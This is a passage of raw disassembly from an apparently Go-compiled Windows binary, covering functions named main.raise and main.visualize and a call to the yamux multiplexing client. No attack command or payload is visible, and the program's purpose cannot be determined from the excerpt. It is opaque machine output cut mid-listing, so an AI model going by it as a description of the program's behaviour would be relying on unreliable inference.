   1402763d2:	48 89 48 10          	mov    QWORD PTR [rax+0x10],rcx
   1402763d6:	48 89 48 18          	mov    QWORD PTR [rax+0x18],rcx
   1402763da:	74 45                	je     0x140276421
   1402763dc:	48 8b 5e 08          	mov    rbx,QWORD PTR [rsi+0x8]
   1402763e0:	48 8b 15 e9 b7 38 00 	mov    rdx,QWORD PTR [rip+0x38b7e9]        # 0x140601bd0 '\x10~e@\x01\x00\x00\x00`T1@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00\\xc0\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00\\xc0\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@'
   1402763e7:	48 8b 3a             	mov    rdi,QWORD PTR [rdx]
   1402763ea:	8b 76 10             	mov    esi,DWORD PTR [rsi+0x10]
   1402763ed:	e9 e6 00 00 00       	jmp    0x1402764d8
   1402763f2:	48 89 84 24 f0 00 00 	mov    QWORD PTR [rsp+0xf0],rax
   1402763f9:	00 
   1402763fa:	48 89 9c 24 f8 00 00 	mov    QWORD PTR [rsp+0xf8],rbx
   140276401:	00 
   140276402:	e8 d9 76 dc ff       	call   0x14003dae0 <runtime.deferreturn>
   140276407:	48 8b 84 24 f0 00 00 	mov    rax,QWORD PTR [rsp+0xf0]
   14027640e:	00 
   14027640f:	48 8b 9c 24 f8 00 00 	mov    rbx,QWORD PTR [rsp+0xf8]
   140276416:	00 
   140276417:	48 81 c4 d8 01 00 00 	add    rsp,0x1d8
   14027641e:	5d                   	pop    rbp
   14027641f:	90                   	nop
   140276420:	c3                   	ret
   140276421:	48 8b 9c 24 00 01 00 	mov    rbx,QWORD PTR [rsp+0x100]
   140276428:	00 
   140276429:	48 89 c1             	mov    rcx,rax
   14027642c:	48 89 f0             	mov    rax,rsi
   14027642f:	e8 8c 62 ff ff       	call   0x14026c6c0 <github.com/hashicorp/yamux.Client>
   140276434:	48 85 db             	test   rbx,rbx
   140276437:	75 71                	jne    0x1402764aa
   140276439:	48 89 84 24 20 01 00 	mov    QWORD PTR [rsp+0x120],rax
   140276440:	00 
   140276441:	48 8d 0d 78 01 00 00 	lea    rcx,[rip+0x178]        # 0x1402765c0 'I;f\x10v%UH\\x89\\xe5H\\x83\\xec\x08M\\x8bf M\\x85\\xe4u\x1bH\\x8bB\x08\x0f\x1fD\x00\x00\\xe8\\x9bi\\xff\\xffH\\x83\\xc4\x08]\\xc3\\xe8\\x90"\\xe0\\xff\\xeb\\xceL\\x8dl$\x18M9,$u\\xdaI\\x89$$\\xeb\\xd4\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xccI;f\x10' <main.raise.deferwrap3>
   140276448:	48 89 8c 24 30 01 00 	mov    QWORD PTR [rsp+0x130],rcx
   14027644f:	00 
   140276450:	48 89 84 24 38 01 00 	mov    QWORD PTR [rsp+0x138],rax
   140276457:	00 
   140276458:	48 8d 8c 24 30 01 00 	lea    rcx,[rsp+0x130]
   14027645f:	00 
   140276460:	48 89 4c 24 68       	mov    QWORD PTR [rsp+0x68],rcx
   140276465:	48 8d 44 24 50       	lea    rax,[rsp+0x50]
   14027646a:	e8 31 71 dc ff       	call   0x14003d5a0 <runtime.deferprocStack>
   14027646f:	48 8b 84 24 20 01 00 	mov    rax,QWORD PTR [rsp+0x120]
   140276476:	00 
   140276477:	e8 84 f7 ff ff       	call   0x140275c00 <main.visualize>
   14027647c:	48 89 84 24 f0 00 00 	mov    QWORD PTR [rsp+0xf0],rax
   140276483:	00 
   140276484:	48 89 9c 24 f8 00 00 	mov    QWORD PTR [rsp+0xf8],rbx
   14027648b:	00 
   14027648c:	e8 4f 76 dc ff       	call   0x14003dae0 <runtime.deferreturn>
   140276491:	48 8b 84 24 f0 00 00 	mov    rax,QWORD PTR [rsp+0xf0]
   140276498:	00 
   140276499:	48 8b 9c 24 f8 00 00 	mov    rbx,QWORD PTR [rsp+0xf8]
   1402764a0:	00 
   1402764a1:	48 81 c4 d8 01 00 00 	add    rsp,0x1d8
   1402764a8:	5d                   	pop    rbp
   1402764a9:	c3                   	ret
   1402764aa:	48 89 9c 24 f0 00 00 	mov    QWORD PTR [rsp+0xf0],rbx
   1402764b1:	00 
   1402764b2:	48 89 8c 24 f8 00 00 	mov    QWORD PTR [rsp+0xf8],rcx
   1402764b9:	00 
   1402764ba:	e8 21 76 dc ff       	call   0x14003dae0 <runtime.deferreturn>
   1402764bf:	48 8b 84 24 f0 00 00 	mov    rax,QWORD PTR [rsp+0xf0]
   1402764c6:	00 
   1402764c7:	48 8b 9c 24 f8 00 00 	mov    rbx,QWORD PTR [rsp+0xf8]
   1402764ce:	00 
   1402764cf:	48 81 c4 d8 01 00 00 	add    rsp,0x1d8
   1402764d6:	5d                   	pop    rbp
   1402764d7:	c3                   	ret
   1402764d8:	49 89 f0             	mov    r8,rsi
   1402764db:	48 21 fe             	and    rsi,rdi
   1402764de:	48 c1 e6 04          	shl    rsi,0x4
   1402764e2:	4c 8b 4c 32 08       	mov    r9,QWORD PTR [rdx+rsi*1+0x8]
   1402764e7:	49 39 d9             	cmp    r9,rbx
   1402764ea:	74 2d                	je     0x140276519
   1402764ec:	49 8d 70 01          	lea    rsi,[r8+0x1]
   1402764f0:	4d 85 c9             	test   r9,r9
   1402764f3:	75 e3                	jne    0x1402764d8
   1402764f5:	48 89 84 24 e0 00 00 	mov    QWORD PTR [rsp+0xe0],rax
   1402764fc:	00 
   1402764fd:	48 8d 05 cc b6 38 00 	lea    rax,[rip+0x38b6cc]        # 0x140601bd0 '\x10~e@\x01\x00\x00\x00`T1@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00\\xc0\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00\\xc0\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@'
   140276504:	e8 17 c4 d9 ff       	call   0x140012920 <runtime.typeAssert>
   140276509:	48 89 c6             	mov    rsi,rax
   14027650c:	48 8b 84 24 e0 00 00 	mov    rax,QWORD PTR [rsp+0xe0]
   140276513:	00 
   140276514:	e9 08 ff ff ff       	jmp    0x140276421
   140276519:	48 8b 74 32 10       	mov    rsi,QWORD PTR [rdx+rsi*1+0x10]
   14027651e:	66 90                	xchg   ax,ax
   140276520:	e9 fc fe ff ff       	jmp    0x140276421
   140276525:	4d 89 e5             	mov    r13,r12
   140276528:	4d 21 dc             	and    r12,r11
   14027652b:	49 c1 e4 04          	shl    r12,0x4
   14027652f:	4f 8b 7c 22 08       	mov    r15,QWORD PTR [r10+r12*1+0x8]
   140276534:	4d 39 cf             	cmp    r15,r9
   140276537:	74 41                	je     0x14027657a
   140276539:	4d 8d 65 01          	lea    r12,[r13+0x1]
   14027653d:	0f 1f 00             	nop    DWORD PTR [rax]
   140276540:	4d 85 ff             	test   r15,r15
   140276543:	75 e0                	jne    0x140276525
   140276545:	48 89 5c 24 48       	mov    QWORD PTR [rsp+0x48],rbx
   14027654a:	48 89 84 24 28 01 00 	mov    QWORD PTR [rsp+0x128],rax
   140276551:	00 
   140276552:	48 8d 05 57 b6 38 00 	lea    rax,[rip+0x38b657]        # 0x140601bb0 '\x10~e@\x01\x00\x00\x00@\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00`T1@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00\\xc0\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@'
   140276559:	4c 89 cb             	mov    rbx,r9
   14027655c:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]
   140276560:	e8 bb c3 d9 ff       	call   0x140012920 <runtime.typeAssert>
   140276565:	48 8b 5c 24 48       	mov    rbx,QWORD PTR [rsp+0x48]
   14027656a:	48 89 c2             	mov    rdx,rax
   14027656d:	48 8b 84 24 28 01 00 	mov    rax,QWORD PTR [rsp+0x128]
   140276574:	00 
   140276575:	e9 98 fd ff ff       	jmp    0x140276312
   14027657a:	4f 8b 4c 22 10       	mov    r9,QWORD PTR [r10+r12*1+0x10]
   14027657f:	4c 89 ca             	mov    rdx,r9
   140276582:	e9 8b fd ff ff       	jmp    0x140276312
   140276587:	48 89 44 24 08       	mov    QWORD PTR [rsp+0x8],rax
   14027658c:	48 89 5c 24 10       	mov    QWORD PTR [rsp+0x10],rbx
   140276591:	48 89 4c 24 18       	mov    QWORD PTR [rsp+0x18],rcx
   140276596:	48 89 7c 24 20       	mov    QWORD PTR [rsp+0x20],rdi
   14027659b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]
   1402765a0:	e8 7b 23 e0 ff       	call   0x140078920 <runtime.morestack_noctxt>
   1402765a5:	48 8b 44 24 08       	mov    rax,QWORD PTR [rsp+0x8]
   1402765aa:	48 8b 5c 24 10       	mov    rbx,QWORD PTR [rsp+0x10]
   1402765af:	48 8b 4c 24 18       	mov    rcx,QWORD PTR [rsp+0x18]
   1402765b4:	48 8b 7c 24 20       	mov    rdi,QWORD PTR [rsp+0x20]
   1402765b9:	e9 22 f9 ff ff       	jmp    0x140275ee0 <main.raise>
   1402765be:	cc                   	int3
   1402765bf:	cc                   	int3
